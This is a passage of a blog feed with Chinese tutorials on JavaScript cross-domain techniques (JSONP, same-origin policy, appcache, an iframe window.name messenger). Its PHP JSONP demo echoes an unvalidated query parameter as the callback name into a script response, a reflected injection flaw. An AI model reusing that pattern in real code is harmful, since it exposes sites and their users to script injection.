+ delta + &quot;次！&quot;); // -1</span></span><br><span class="line">                $(<span class="string">&quot;btn_last_pic&quot;</span>).onclick(random_num);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>Reference [参考]</h3><p>　　1.http://blog.163.com/jinlu_hz/blog/static/113830152201122911356714/</p><p>　　2.http://qiaolevip.iteye.com/blog/1673396</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript跨域（2）：JSONP跨域</title>
      <link href="/blog/2013/04/03/cb-CDS_jsonp/"/>
      <url>/blog/2013/04/03/cb-CDS_jsonp/</url>
      
        <content type="html"><![CDATA[<p>　　祭祖归来，继续细说跨域~</p><p>　　话说<a title="什么是跨域" href="http://www.cnblogs.com/hustskyking/archive/2013/03/31/CDS-introduce.html" target="_blank">上次</a>我们讲到了啥玩意儿是跨域，至于怎么跨域还没开始动笔。今天就说说JSONP跨域。</p><p>　　JSONP（JSON with padding）是<a class="titlelink" href="http://www.cnblogs.com/hustskyking/articles/2986357.html">JSON</a>的一种\使用模式"，它是非官方协议<span>允许在服务器端集成Script tags返回至客户端，通过javascript callback的形式实现跨域访问（这仅仅是JSONP简单的实现形式）。</span></p><p>　　P.S：</p><p>　　　　1.楼主懂一点点php，所以DEMO中的后台语言就用PHP来演示。</p><p>　　　　2.为了方便测试，楼主弄了SAE和BAE。</p><h3>Prelude [前奏]</h3><p>　　如果我们请求一个JSON数据：（SAE地址：<span>http://qianduannotes.sinaapp.com/test/testData_1.json</span>）</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>一个简单的json数据</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span> : <span class="string">&quot;Barret Lee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sex&quot;</span>    : <span class="string">&quot;男&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hobby&quot;</span>: <span class="string">&quot;女&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　报个什么错，大家应该知道了吧~&nbsp;</p><blockquote><p><span>Origin<span><strong>&nbsp;null&nbsp;</strong></span>is not allowed by Access-Control-Allow-Origin</span></p></blockquote><p>　　先解释下这个null是个什么东东。很多人在测试的时候是在没有诸如apache、IIS环境下运行的程序，也就是在本地运行，此时origin就是null，所有<span>Access-Control-Allow-Origin这个东西不允许源null请求数据。当然如果你测试的时候在apache下运行，那这里的null就会变成你的IP了~</span></p><h3><span>Then [接着]</span></h3><p><span>　　JSONP，我们开始入题吧~&nbsp;</span></p><p><span>　　先说说后台返回个什么东西：（SAE地址：<span>http://qianduannotes.sinaapp.com/test/CDS_jsonp.json</span>）</span></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fun</span> = <span class="variable">$_GET</span>[<span class="string">&quot;woo&quot;</span>];  <span class="comment">//先假设woo对应的是 trigger ；</span></span><br><span class="line">    <span class="variable">$ctt</span> = <span class="string">&quot;Barret Lee&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fun</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$ctt</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　后台数据解析之后就是这样的：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">trigger</span><span class="params">(木子Vs立青)</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　有人就要开始惊叹了，肿么是 木子Vs立青&nbsp;，没有引号包住？？是的，没有引号，当$ctt是一个json数据的时候，我们得到的结果就是：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">trigger</span><span class="params">(JSON)</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　然后用一些熟知的方法来解析这些JSON（下次会讲解如何解析JSON）。</p><p>　　说了半天还是没讲客户端的操作，O(&cap;_&cap;)O~ &nbsp;不急不急。</p><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://qianduannotes.sinaapp.com/test/CDS_jsonp.php?woo=trigger&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">obj</span>)</span></span><span class="language-xquery">&#123;　　　　//注：这里只是随便写的一个函数，obj是为解析的。　　　　//obj = parse(obj);　　　<span class="built_in">　document</span>.getElementById(<span class="string">&quot;container&quot;</span>).innerHTML = obj;　　&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　习惯上jsonp请求时，会使用jsonp为参数，即<span>jsonp=trigger</span>，我觉得都无所谓啦，只要你用的爽就行。</p><p>　　如果你想传更多参数，那也是一样的：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://qianduannotes.sinaapp.com/test/CDS_jsonp.php?woo=trigger&lt;a=va&lt;b=vb&lt;c=vc&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>Attention [注意事项]</h3><p>　　1.第一也是最重要的：JSONP不提供错误处理。如果动态插入的代码正常运行，你可以得到返回，但是如果失败了，那么什么都不会发生。你无法获得一个404的错误，也不能取消这个请求。</p><p>　　2.另外一个重要的缺点是如果使用了不信任的服务会造成很大的安全隐患。</p><h3>Reference [参考资料]</h3><p>　　1.<a title="wiki jsonp" href="http://zh.wikipedia.org/zh-cn/JSONP" target="_blank">wiki</a></p><p>　　2.<a title="百度百科 jsonp" href="http://baike.baidu.com/view/2131174.htm" target="_blank">百度百科</a></p><p>　　3.<a title="jsonp" href="http://developer.51cto.com/art/201105/264791.htm" target="_blank">51CTO</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 跨域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript跨域（1）：什么是跨域，如何跨域</title>
      <link href="/blog/2013/03/31/cb-CDS-introduce/"/>
      <url>/blog/2013/03/31/cb-CDS-introduce/</url>
      
        <content type="html"><![CDATA[<p>　　无数次看到：<span><span>Origin null is not allowed by Access-Control-Allow-Origin</span>&nbsp;, 网络没有让你绝望，但是或许会让你蛋疼，因为你找了半天没看到一个比较实用的解决方案，亦或者水平不够，别人写的东西累赘没看懂，抑或是。。。</span></p><p>　　网上看到了一篇文章&mdash;&mdash;<a title="cds" href="http://www.cnblogs.com/hustskyking/articles/ten-methods-cross-domain.html" target="_blank">跨域资源共享的10中方式</a>，已经放在自己的家里了O(&cap;_&cap;)O~</p><p>　　跨域也是平时项目中比较让人头疼的一个玩意儿，上文只是简要地提出了有哪些跨域方式，这里呢，将向大家详细说明，各种使用频率比较高的跨域方式。</p><p>　　什么是跨域：</p><blockquote><p><span>A&nbsp;</span><strong>cross-domain solution</strong><span>&nbsp;(</span><strong>CDS</strong><span>) is a means of&nbsp;</span><a title="Information assurance" href="http://en.wikipedia.org/wiki/Information_assurance">information assurance</a><span>&nbsp;that provides the ability to manually or automatically access or transfer between two or more differing security domains.</span></p></blockquote><p>　　上面是从wiki上引用过来的。意思是：解决两个安全域之间的信息传递，这个就叫做CDS&mdash;&mdash;跨域解决方案。首先解释下怎么样的两个域之间的数据传输需要跨越。</p><p><span>&nbsp;</span></p><h3>What [什么是跨域]</h3><p>　　JavaScript出于安全方面的考虑，不允许跨域调用其他页面的对象。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。这里把涉及到跨域的一些问题简单地整理一下：</p><p>　　首先什么是跨域，简单地理解就是因为JavaScript同源策略的限制，a.com 域名下的js无法操作b.com或是c.a.com域名下的对象。更详细的说明可以看下表：</p><table class="border"><tbody><tr><th>URL</th><th>说明</th><th>是否允许通信</th></tr><tr><td>http://www.a.com/a.jshttp://www.a.com/b.js</td><td>同一域名下</td><td>允许</td></tr><tr><td>http://www.a.com/lab/a.jshttp://www.a.com/script/b.js</td><td>同一域名下不同文件夹</td><td>允许</td></tr><tr><td>http://www.a.com:8000/a.jshttp://www.a.com/b.js</td><td>同一域名，不同端口</td><td>不允许</td></tr><tr><td>http://www.a.com/a.js//www.a.com/b.js</td><td>同一域名，不同协议</td><td>不允许</td></tr><tr><td>http://www.a.com/a.jshttp://70.32.92.74/b.js</td><td>域名和域名对应ip</td><td>不允许</td></tr><tr><td>http://www.a.com/a.jshttp://script.a.com/b.js</td><td>主域相同，子域不同</td><td>不允许</td></tr><tr><td>http://www.a.com/a.jshttp://a.com/b.js</td><td>同一域名，不同二级域名（同上）</td><td>不允许（cookie这种情况下也不允许访问）</td></tr><tr><td>http://www.cnblogs.com/a.jshttp://www.a.com/b.js</td><td>不同域名</td><td>不允许</td></tr></tbody></table><p><span>&nbsp;</span></p><h3>same-origin policy [同源策略]</h3><p>　　在客户端编程语言中，如<span class="wp_keywordlink_affiliate">javascript</span>和ActionScript，同源策略是一个很重要的安全理念，它在保证数据的安全性方面有着重要的意义。同源策略规定跨域之间的脚本是隔离的，一个域的脚本不能访问和操作另外一个域的绝大部分属性和方法。</p><p>　　那么什么叫相同域，什么叫不同的域呢？当两个域具有相同的协议(如http), 相同的端口(如80)，相同的host（如www.example.org)，那么我们就可以认为它们是相同的域。比如http://www.example.org/和http://www.example.org/sub/是同域，而http://www.example.org, //www.example.org, http://www.example.org:8080, http://sub.example.org中的任何两个都将构成跨域。同源策略还应该对一些特殊情况做处理，比如限制file协议下脚本的访问权限。本地的<span class="wp_keywordlink_affiliate">html</span>文件在浏览器中是通过file协议打开的，如果脚本能通过file协议访问到硬盘上其它任意文件，就会出现安全隐患，目前IE8还有这样的隐患。</p><p>　　受到同源策略的影响，跨域<span class="wp_keywordlink_affiliate">资源</span>共享就会受到制约。但是随着人们的实践和浏览器的进步，目前在跨域请求的技巧上，有很多宝贵经验的沉淀和积累。这里我把跨域<span class="wp_keywordlink_affiliate">资源</span>共享分成两种，一种是单向的数据请求，还有一种是双向的消息通信。</p><h3>How [如何跨域]</h3><p>　　你可以看看这个提纲，<a title="CDS" href="http://www.cnblogs.com/hustskyking/articles/ten-methods-cross-domain.html" target="_blank">跨域十法</a>，也可以等等，我会很详细很具体地告诉你如何跨域~</p><p>　　O(&cap;_&cap;)O哈哈~</p><p>　　下一节将给大家细说JSONP方法跨域。</p><h3>Reference [参考资料]</h3><p>　　1.<a title="wiki CDS" href="http://en.wikipedia.org/wiki/Cross-domain_solution" target="_blank">wiki</a></p><p>　　2.<a title="CDS" href="http://www.woiweb.net/10-cross-domain-methods.html" target="_blank">疯狂小强</a></p><p>　　3.<a title="CDS" href="http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html" target="_blank">Rain Man</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 跨域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript本地储存（3）：离线web应用</title>
      <link href="/blog/2013/03/30/cb-javascript-applicationcache/"/>
      <url>/blog/2013/03/30/cb-javascript-applicationcache/</url>
      
        <content type="html"><![CDATA[<p>　　前两篇文章分别介绍了<a title="javascript cookie" href="http://www.cnblogs.com/hustskyking/archive/2013/03/27/javascript-cookie.html" target="_blank">Cookie应用</a>和<a title="userdata and localstorage" href="http://www.cnblogs.com/hustskyking/archive/2013/03/28/javascript-userdata-and-localstorage.html" target="_blank">另一种本地储存方式</a>，无论是cookie、userData还是localStorage都是一段保存在客户端磁盘的一段文本，他们可以被主动删除，但是本文要讲的\应用程序缓存"是HTML5中新增的一个技术，他允许web应用将应用程序自身本地保存到用户的浏览器中，他是不会随着用户清楚浏览器缓存而被清除的。</p><blockquote>不像localStorage和sessionS只是保存web应用程序相关的数据，他是将应用程序本身保存起来&mdash;&mdash;应用程序所需运行的所有文件（HTML、CSS、JavaScript、图片等）。&mdash;&mdash;《Javascript权威指南（第六版）》Page-594</blockquote><p>　　\应用程序缓存"真正意义上不是\"缓存，更好的说法应该称之为\应用程序存储"。</p><h3>Introduction [简单介绍]</h3><p>　　通过在应用程序主HTML页面的&lt;html&gt;标签中设置manifest属性，只想到清单文件就行了。这里的清单文件就是，将要缓存的文件列表。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">manifest</span>=<span class="string">&quot;myapp.appcache&quot;</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">head</span>&gt;</span>...<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">body</span>&gt;</span>...<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　清单文件格式也是有要求的，他的杭寿必须以\CACHE MANIFEST"字符串开始，其余就是要缓存的文件URL列表，一行一个URL。</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">CACHE MANIFEST</span><br><span class="line">#上一行表示此文件是一个清单文件。本行为注释</span><br><span class="line"></span><br><span class="line">#下面的内容都是应用程序依赖的资源文件的URL</span><br><span class="line">myapp<span class="selector-class">.html</span></span><br><span class="line">myapp<span class="selector-class">.js</span></span><br><span class="line">myapp<span class="selector-class">.css</span></span><br><span class="line">images/backgorund<span class="selector-class">.png</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　有人可能会问了：那清单文件一定要以appcache作为未见的扩展名么？　　答案是否定的，web服务器真正识别清单文件的方式是通过"text/cache-manifest"这个MIME类型的一个清单。如果服务器将清单文件的Content-Type的头信息设置成其他MIME类型，那就不会缓存应用程序了，因此，肯呢过需要对web服务器做一定的配置来使用这个MIME类型，比如在web应用目录下创建Apache服务器的一个.htaccess文件。</p><h3>More [更多介绍]</h3><p><strong>1.复杂的清单</strong></p><p>　　先给个清单：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">CACHE MANIFEST</span><br><span class="line"></span><br><span class="line">CACHE:</span><br><span class="line">myapp<span class="selector-class">.html</span></span><br><span class="line">myapp<span class="selector-class">.css</span></span><br><span class="line">myapp<span class="selector-class">.js</span></span><br><span class="line"></span><br><span class="line">FALLBACK</span><br><span class="line">video/ offline_help<span class="selector-class">.html</span></span><br><span class="line"></span><br><span class="line">NETWORK:</span><br><span class="line">cgi/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　"CACHE"应该是不用细说了。　　"NETWORK"： 标识了该ＵＲＬ中的资源从不缓存，总要通过网络获取。　　"FALLBACK"：区域中的清单项每行都包含两个URL，第二个URL是指需要加载和存储在缓存中的资源，第一个URL是一个前缀。任何能够匹配到这个前缀的URL都不会缓存起来，但是可能的haunted，他们会从网络中载入。如果从网络中载入这样一个URL失败的话，就会使用第二个URL指定的缓存资源来代替，从缓存中获取。</p><p>　　想想一个web应用包含一定数量的视频教程，这些视频都很大，显然把他们缓存在本地是不合适的，因为，在离线状态心爱，通过清单文件中的fallback区域，就可以使用一些急于文本的帮助文件来代替了。</p><p><strong>2.缓存的更新</strong></p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CACHE </span>MANIFEST</span><br><span class="line"><span class="comment"># MyApp version 1 (更改这个数九就可以让浏览器重新下载这个文件)</span></span><br><span class="line">Myapp.html</span><br><span class="line">Myapp.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure><p>　　浏览器在检查清单文件以及更新缓存的操作是异步的，可能是在从缓存中载入应用之前，也可能同时进行。　　浏览器在更新缓存过程中会触发一系列事件，可以通过注册处理程序来跟踪这个过程同时提供反馈给用户。如下：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">applicationCache.onupdateready <span class="operator">=</span> function()&#123;</span><br><span class="line">    var reload <span class="operator">=</span> confirm(<span class="string">&quot;发现一个新版本，需要刷新页面，点击确定刷新。&quot;</span>)<span class="comment">;</span></span><br><span class="line">    if(reload) locatiuon.reload()<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　注：只有支持应用程序缓存的浏览器才会有applicationCache属性，当然除了上面例子的updateready时间之外，还有其他7中应用程序缓存时间可以监控。</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">var appCache = window.applicationCache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title">logEvent</span>(e) &#123;</span><br><span class="line">    console.log(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title">logError</span>(e) &#123;</span><br><span class="line">    console.log(\error &quot; + e);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">appCache.addEventListener(<span class="string">&quot;cached&quot;</span>, logEvent, <span class="literal">false</span>);</span><br><span class="line">appCache.addEventListener(<span class="string">&quot;checking&quot;</span>, logEvent, <span class="literal">false</span>);</span><br><span class="line">appCache.addEventListener(<span class="string">&quot;downloading&quot;</span>, logEvent, <span class="literal">false</span>);</span><br><span class="line">appCache.addEventListener(<span class="string">&quot;error&quot;</span>, logError, <span class="literal">false</span>);</span><br><span class="line">appCache.addEventListener(<span class="string">&quot;noupdate&quot;</span>, logEvent, <span class="literal">false</span>);</span><br><span class="line">appCache.addEventListener(<span class="string">&quot;obsolete&quot;</span>, logEvent, <span class="literal">false</span>);</span><br><span class="line">appCache.addEventListener(<span class="string">&quot;progress&quot;</span>, logEvent, <span class="literal">false</span>);</span><br><span class="line">appCache.addEventListener(<span class="string">&quot;updateready&quot;</span>, logEvent, <span class="literal">false</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>Related blog [相关博文]</h3><p>　　<a class="titlelink" href="http://www.cnblogs.com/hustskyking/archive/2013/03/27/javascript-cookie.html">JavaScript本地储存（1）：cookie在前端</a></p><p>　　<a class="titlelink" href="http://www.cnblogs.com/hustskyking/archive/2013/03/28/javascript-userdata-and-localstorage.html">JavaScript本地储存（2）：userData和localStorage</a><span>&nbsp;</span></p><h3>Reference [参考资料]</h3><p>　　1.《JavaScript权威指南（第六版）》&mdash;&mdash; 淘宝团队翻译&nbsp;&nbsp; <a title="当当地址" href="http://product.dangdang.com/main/product.aspx?product_id=22722790" target="_blank">当当</a></p><p>　　2. <a title="about applicationCache" href="http://www.kuqin.com/webpagedesign/20111217/316394.html" target="_blank">other</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iframe跨域通信的通用解决方案</title>
      <link href="/blog/2013/03/29/cb-lightweight-solution-for-an-iframe-cross-domain-communication/"/>
      <url>/blog/2013/03/29/cb-lightweight-solution-for-an-iframe-cross-domain-communication/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.alloyteam.com/wp-content/uploads/2012/08/two_messenger.png" rel="prettyPhoto[1]"><img class="aligncenter lh_lazyimg slideshow_imgs" title="图2" src="http://www.alloyteam.com/wp-content/uploads/2012/08/two_messenger.png" alt="2个信使的情况" width="390" height="322"></a></p><p><strong>一、背景</strong></p><p>在这个Web页面越来越丰富的时代，页面通过iframe嵌入其他的页面也越来越常见。但由于浏览器同源策略的限制，不同域之间属性和操作是无法直接交互的，所以在这个时候，开发者多多少少需要一些方案来突破这些限制。跨域问题涉及的地方也很多，如文档之间的消息通信、ajax请求、Cookie等，本文讨论的是iframe和父页面的消息通信。</p><p><strong>二、现状</strong></p><p>目前网上也可以找到各种解决方案（少说都有10+个，有兴趣的话可以<a href="http://www.woiweb.net/10-cross-domain-methods.html" target="_blank">去看看</a>），对于现代浏览器来说，原生的postMessage API一定是不二的选择，所以各种方案的不同点均在于IE 6、7中的处理（不用兼容IE6、7的同志可以去看其他文章了）。当然这么多方案有各种优缺点，甚至有些只支持单向跨域，个人觉得实际意义不大。另外一些方案需要proxy.html这样的代理页面做中转，但是涉及服务器上的部署，并且对于多方合作来说还是有些麻烦。</p><p><strong>三、思路</strong></p><p>虽然不再复述现有的各种方案，但还是想交待一点上下文。相信网上看到最多方案就是利用location.hash或是window.name进行iframe的跨域通信：</p><ul><li>location.hash会直接暴露在URL里，并且在一些浏览器里会产生历史记录，数据安全性不高也影响用户体验，所以不做考虑。另外由于URL大小的限制，支持传递的数据量也不大。</li><li>window.name相比来讲就好很多了，支持2M的数据量，并且当iframe的页面跳到其他地址时，其window.name值保持不变，副作用可以说是最小的。</li></ul><p>讲到这思路也比较清晰了，咱们就用window.name呗，但问题又来了：只有两个页面同域时才能访问window.name。这个问题还好，只要把iframe改为与父页面同域就可以了。这又衍生了新的问题：这不是意味着只能单向通信了吗，iframe怎么向父页面发消息（不可能去改父页面的location吧）？在暗骂坑爹的同时偶然发现了一个很神奇的方法，就是想访问一个iframe的window.name时，只要将其location改为"about:blank"即可，屡试不爽~没错这个\特性"可以视为IE6/7的一项安全性问题，但利用这个特性来进行跨域通信并没有实际的安全风险。</p><p>具体的实现见下图，在iframe的内部再创建一个iframe（我们称之为信使），父子页面轮询信使的window.name，父子页面各自使用变量保存window.name，轮询时发现有变化即被视为收到消息。基本原理就是这么简单，我们继续..</p><p><a href="http://www.alloyteam.com/wp-content/uploads/2012/08/one_messenger1.png" rel="prettyPhoto[1]"><img class="aligncenter size-full wp-image-2868 lh_lazyimg slideshow_imgs" title="图1" src="http://www.alloyteam.com/wp-content/uploads/2012/08/one_messenger1.png" alt="1个信使的情况" width="487" height="403"></a></p><p>图1</p><p>作为一个通用的解决方案，我们的目标是提供一个js文件，封装通信的接口，需要通信的页面只要加载js文件就行。但在封装前，需要考虑更复杂一点的情况：当父子页面双方频率较高地双向通信时，如何进行支持？按照上述的方案，信使的window.name并没有读写锁的概念，这意味着消息很容易乱掉或被漏掉。所以更好的方案应该是：创建两个信使，分别负责"父–&gt;子"和"子–&gt;父"的消息传递，并且为了防止消息被冲掉，发送消息时会维护一个消息队列，在取消息时处理消息队列里的所有消息。见图2。</p><p><a href="http://www.alloyteam.com/wp-content/uploads/2012/08/two_messenger.png" rel="prettyPhoto[1]"><img class="aligncenter size-full wp-image-2869 lh_lazyimg slideshow_imgs" title="图2" src="http://www.alloyteam.com/wp-content/uploads/2012/08/two_messenger.png" alt="2个信使的情况" width="488" height="402"></a></p><p>图2</p><p><strong>四、封装</strong></p><p>最后的封装就是加入了postMessage API的检测，另外也要判断是否为跨域，这样就满足了所有iframe通信的情况了。这里实现的信使只负责消息的监听和发送，所以在使用上是非常简单的：</p><div><div id="highlighter_724833" class="syntaxhighlighter  js"><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 父页面中</span><br><span class="line"><span class="regexp">//</span> 初始化信使, 告知与其交互的iframe引用</span><br><span class="line">var messenger = Messenger.initInParent(iframeEl);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 监听消息</span><br><span class="line">messenger.onmessage = <span class="keyword">function</span> (data) &#123;</span><br><span class="line">          ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 发送消息</span><br><span class="line">messenger.send(message);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> iframe中</span><br><span class="line"><span class="regexp">//</span> 初始化信使</span><br><span class="line">var messenger = Messenger.initInIframe();</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 监听消息</span><br><span class="line">messenger.onmessage = <span class="keyword">function</span> (data) &#123;</span><br><span class="line">      ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 发送消息</span><br><span class="line">messenger.send(message);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div><p>具体使用可以参考下方的demo : )</p><p><strong>五、总结</strong></p><p>虽然国内也有人提过使用"about:blank"进行iframe通信的，但是代码的封装和可读性都不是太好，<a href="http://www.ne.jp/asahi/nanto/moon/2011/12/08/ie-post-message.html" target="_blank">本方案</a>是一日本人所提出<span>，我觉得处理的很好，所以就拿出来和大家分享下</span>。虽然尝试过优化轮询那一块，但暂时无果，有兴趣的朋友可以一起研究下~</p><p><strong>DEMO：<a href="http://www.alloyteam.com/wp-content/uploads/2012/08/parent.html" target="_blank">点击这里</a></strong></p><p><strong>脚本下载：<a href="http://biqing.alloyteam.com/lab/messenger/messenger.js" target="_blank">http://biqing.alloyteam.com/lab/messenger/messenger.js</a></strong></p><p><strong>GitHub：<a href="//github.com/biqing/MessengerJS" target="_blank">//github.com/biqing/MessengerJS</a></strong></p><p><strong>原文链接：http://www.alloyteam.com/2012/08/lightweight-solution-for-an-iframe-cross-domain-communication</strong></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域资源共享的10种方式</title>
      <link href="/blog/2013/03/29/cb-ten-methods-cross-domain/"/>
      <url>/blog/2013/03/29/cb-ten-methods-cross-domain/</url>
      
        <content type="html"><![CDATA[<p>在客户端编程语言中，如<span class="wp_keywordlink_affiliate"><a title="javascript" href="http://www.woiweb.net/category/javascript" rel="nofollow" target="_blank">javascript</a></span>和ActionScript，<a href="http://www.woiweb.net/same-origin-policy.html">同源策略</a>是一个很重要的安全理念，它在保证数据的安全性方面有着重要的意义。<a href="http://www.woiweb.net/same-origin-policy.html">同 源策略</a>规定<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>之间的脚本是隔离的，一个域的脚本不能访问和操作另外一个域的绝大部分属性和方法。那么什么叫相同域，什么叫不同的域呢？<span id="more-1400"></span></p><h3>同源策略</h3><p>在客户端编程语言中，如<span class="wp_keywordlink_affiliate"><a title="javascript" href="http://www.woiweb.net/category/javascript" rel="nofollow" target="_blank">javascript</a></span>和ActionScript，同源策略是一个很重要的安全理念，它在保证数据的安全性方面有着重要的意义。同源策略规定<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>之间的脚本是隔离的，一个域的脚本不能访问和操作另外一个域的绝大部分属性和方法。</p><p>那么什么叫相同域，什么叫不同的域呢？当两个域具有相同的协议(如http), 相同的端口(如80)，相同的host（如www.example.org)，那么我们就可以认为它们是相同的域。比如http://www.example.org/和http://www.example.org/sub/是同域，而http://www.example.org, //www.example.org, http://www.example.org:8080, http://sub.example.org中的任何两个都将构成<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>。同源策略还应该对一些特殊情况做处理，比如限制file协议下脚本的访问权限。本地的<span class="wp_keywordlink_affiliate"><a title="html" href="http://www.woiweb.net/category/html_css" rel="nofollow" target="_blank">html</a></span>文件在浏览器中是通过file协议打开的，如果脚本能通过file协议访问到硬盘上其它任意文件，就会出现安全隐患，目前IE8还有这样的隐患。</p><p>受到同源策略的影响，<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a><span class="wp_keywordlink_affiliate"><a title="资源" href="http://www.woiweb.net/category/resource" rel="nofollow" target="_blank">资源</a></span>共享就会受到制约。但是随着人们的实践和浏览器的进步，目前在<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>请求的技巧上，有很多宝贵经验的沉淀和积累。这里我把<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a><span class="wp_keywordlink_affiliate"><a title="资源" href="http://www.woiweb.net/category/resource" rel="nofollow" target="_blank">资源</a></span>共享分成两种，一种是单向的数据请求，还有一种是双向的消息通信。接下来我将罗列出常见的一些<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>方式，以下<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>实例的源代码可以从<a href="http://github.com/colorhook/crossdomain" target="_blank">这里获得</a>。</p><h3>单向<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a></h3><h4><strong>JSONP</strong></h4><p>JSONP (JSON with Padding)是一个简单高效的<a href="http://www.woiweb.net/tag/%E8%B7%A8%E5%9F%9F">跨域</a>方式，<span class="wp_keywordlink_affiliate"><a title="html" href="http://www.woiweb.net/category/html_css" rel="nofollow" 